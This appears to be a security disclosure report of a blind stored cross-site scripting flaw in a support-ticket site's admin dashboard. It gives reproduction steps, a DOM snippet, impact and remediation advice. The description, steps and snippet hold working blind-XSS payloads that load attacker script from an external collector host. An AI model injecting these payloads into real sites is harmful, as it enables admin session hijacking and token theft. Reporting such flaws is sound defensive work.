## Title

Blind Cross-Site Scripting (XSS) via Unsanitized Customer Name and Subject Fields on SupportHub Admin Dashboard.

## Affected URL

https://supporthub.pwnedbox.site/

## Description

A Blind Cross-Site Scripting (XSS) vulnerability was identified in the support request submission handler of the SupportHub platform]. User-supplied input submitted through support ticket fields (such as Customer Name and Subject) is stored persistently in the backend database without proper input sanitization, encoding, or output escaping.

When an administrative user reviews submitted support tickets within the admin dashboard, the stored payloads—such as `<script src="https://xss.report/c/vansh"></script>`—are rendered directly into the Document Object Model (DOM). This causes the malicious script to execute asynchronously within the administrative user's privileged session context, allowing remote code execution, session hijacking, or administrative action compromise.

## Steps to Reproduce

1. Navigate to the target application submission interface: `https://supporthub.pwnedbox.site/submit.php`.
2. Locate the support request form and inject JavaScript payloads into input fields (e.g., entering `'"&><script src="https://xss.report/c/vansh"></script>` into the Name and Subject fields).
3. Submit the support request form.
4. Log into the administrative control panel where stored support tickets are reviewed (`https://supporthub.pwnedbox.site/admin/` dashboard).
5. Observe that the stored payload executes in the DOM of the administrative dashboard, firing requests to the external collector (`xss.report`).

## POC

<img width="1448" height="1254" alt="image" src="https://github.com/user-attachments/assets/b062cfa9-5839-416b-87b5-afee2bf89687" />
<img width="1920" height="1031" alt="image" src="https://github.com/user-attachments/assets/e1c60d85-c892-4d09-862e-6b693e58dc2f" />


### Vulnerable DOM Snippet

```html
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Admin — SupportHub</title>
    <link rel="stylesheet" href="../assets/style.css">
  </head>
  <body class="dashboard">
    <nav>
      <a class="brand" href="../index.php"><span class="logo">S</span> SupportHub</a>
      <div class="navlinks">
        <a href="../index.php">View site</a>
        <a href="logout.php">Sign out</a>
      </div>
    </nav>
    <main class="dash">
      <div class="dashhead">
        <div>
          <span class="eyebrow">ADMIN WORKSPACE</span>
          <h1>Support requests</h1>
          <p>Review, update and resolve customer conversations.</p>
        </div>
        <a class="primary btn" href="../submit.php">New request</a>
      </div>
      <div class="stats">
        <div><small>Total</small><strong>2</strong></div>
        <div><small>Open</small><strong>2</strong></div>
        <div><small>Pending</small><strong>0</strong></div>
        <div><small>Resolved</small><strong>0</strong></div>
      </div>
      <form class="filters">
        <input name="q" value="" placeholder="Search tickets, names, emails...">
        <select name="status">
          <option value="">All statuses</option>
          <option>open</option>
          <option>pending</option>
          <option>resolved</option>
          <option>closed</option>
        </select>
        <select name="priority">
          <option value="">All priorities</option>
          <option>low</option>
          <option>normal</option>
          <option>high</option>
          <option>urgent</option>
        </select>
        <button>Filter</button>
      </form>
      <div class="tablewrap">
        <table>
          <thead>
            <tr>
              <th>Ticket</th>
              <th>Customer</th>
              <th>Subject</th>
              <th>Priority</th>
              <th>Status</th>
              <th>Created</th>
            </tr>
          </thead>
          <tbody>
            <tr onclick="location.href='view.php?id=2'">
              <td><b>SH-261109-A103F4</b></td>
              <td>'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script><small>abc@gmail.com</small></td>
              <td>'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script></td>
              <td><span class="priority normal">Normal</span></td>
              <td><span class="badge open">Open</span></td>
              <td>Nov 9, 2026</td>
            </tr>
            <tr onclick="location.href='view.php?id=1'">
              <td><b>SH-261022-D258A1</b></td>
              <td>'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"><small>hello@gmail.com</small></td>
              <td>'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></td>
              <td><span class="priority normal">Normal</span></td>
              <td><span class="badge open">Open</span></td>
              <td>Oct 22, 2026</td>
            </tr>
          </tbody>
        </table>
      </div>
    </main>
  </body>
</html>
```

## Impact

1. Execution of arbitrary JavaScript code within the high-privilege session of an administrator reviewing stored support requests.
2. Compromise of administrative sessions, potential cookie or token exfiltration, and unauthorized modification of ticket statuses or customer conversation data.
3. Persistent code execution affecting backend triage handlers and support staff review dashboards.

## Remediation

1. Implement strict context-aware output encoding (such as HTML entity encoding) for all stored user inputs when rendering them in administrative tables, dashboards, or detail views.
2. Apply strict input validation and sanitization policies on all support ticket submission endpoints (Name, Subject, Message fields) to reject or neutralize HTML markup and script tags.
3. Deploy a comprehensive Content Security Policy (CSP) restricting inline script execution and unauthorized external script domains.
